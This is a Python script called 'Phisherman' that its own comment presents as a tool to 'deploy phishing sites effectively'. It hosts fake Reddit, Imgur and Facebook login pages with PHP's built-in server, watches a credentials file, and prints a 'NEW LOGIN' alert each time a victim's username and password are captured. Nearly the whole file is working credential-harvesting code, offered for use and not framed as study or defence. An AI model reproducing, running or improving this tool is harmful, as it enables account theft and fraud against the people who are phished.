#!/usr/bin/python3
# A program that allows you to deploy phishing sites effectively.

import os, sys, datetime, colorama, threading, subprocess

root = "/usr/local/src/fish-src/"
credentials = "{}credentials.txt".format(root)

directories = {
    'Reddit': "{}Reddit/".format(root),
    'Imgur': "{}Imgur/".format(root),
    'Facebook': "{}Facebook/".format(root)
}

DEFAULT_PAYLOAD = directories["Facebook"]
DEFAULT_PORT = 8000

payload = DEFAULT_PAYLOAD
port = DEFAULT_PORT

help_text = """Phisherman - Fake login client.
Host fake login sites with the {}PHP{} server utility.{}
 -w | {}*{} Specify the website you would like to host.
 -p | {}*{} Specify the port you wish to host it upon.
 -c | {}*{} Print the contents of the credentials file.
 -r | {}*{} Reset the contents of the credentials file.
 -h | {}*{} Prints this display of text.""".format(
    colorama.Fore.GREEN,
    colorama.Style.RESET_ALL,
    colorama.Fore.WHITE,
    colorama.Fore.BLUE,
    colorama.Fore.WHITE,
    colorama.Fore.BLUE,
    colorama.Fore.WHITE,
    colorama.Fore.BLUE,
    colorama.Fore.WHITE,
    colorama.Fore.BLUE,
    colorama.Fore.WHITE,
    colorama.Fore.BLUE,
    colorama.Fore.WHITE
)

def Response(text, code):
    notification_type = None

    match code:
        case 0:
            notification_type = colorama.Fore.RED
        case 1:
            notification_type = colorama.Fore.GREEN
        case 2:
            notification_type = colorama.Fore.BLUE

    print("{}[{}+{}]{} {}".format(
        colorama.Style.RESET_ALL,
        notification_type,
        colorama.Style.RESET_ALL,
        colorama.Fore.WHITE,
        text
    ))

    if notification_type == 0: sys.exit()

def Help():
    print(help_text)
    sys.exit()

try:
    for i in range(0, len(sys.argv)):
        match sys.argv[i]:
            case '-c':
                file = open(credentials, 'r')
                lines = file.readlines()
                
                for line in lines:
                    print(line,end="")
                    file.close()
                    sys.exit()
            case '-r':
                open(credentials, 'w').close()
                sys.exit()
            case '-l':
                for directory in directories:
                    Response("{}".format(directory), 2)
                    sys.exit()
            case '-h':
                Help()
            case '-w':
                selected = False
                for directory in directories:
                    if sys.argv[i + 1].lower() == directory.lower():
                        payload = directories.get(directory)
                        selected = True
                if not selected:
                    Response("Invalid selection, please use the -l flag to view available options.", 0)
                    sys.exit()
            case '-p':
                port = int(sys.argv[i + 1])

    while True:
        def InitiatePHP():
            process = subprocess.run(["php -S 127.0.0.1:{} -t {}".format(port, payload)], shell=True, capture_output=True, text=True)

        server_thread = threading.Thread(target=InitiatePHP)
        server_thread.start()

        def PrintTime():
            previous_timestamp = current_timestamp

            current_time = datetime.datetime.now()
            formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")

            return formatted_time

        def PrintLatest():
            file = open(credentials, 'r')
            lines = file.readlines()
            output = lines[len(lines) - 1]
            file.close()

            return output

        previous_timestamp = os.path.getmtime(credentials)

        while True:
            current_timestamp = os.path.getmtime(credentials)

            if current_timestamp != previous_timestamp:
                previous_timestamp = current_timestamp;
                print("[{}] The credentials file has been updated.".format(PrintTime()))
                print("{}{}{}{} | {}".format(
                    colorama.Style.BRIGHT,
                    colorama.Fore.RED,
                    "NEW LOGIN",
                    colorama.Style.RESET_ALL,
                    PrintLatest()
                ),end="")
except KeyboardInterrupt:
    Response("Caught keyboard interruption, exiting safely.", 0)
except ValueError:
    Response("Value error, please ensure your port and selection are valid.", 0)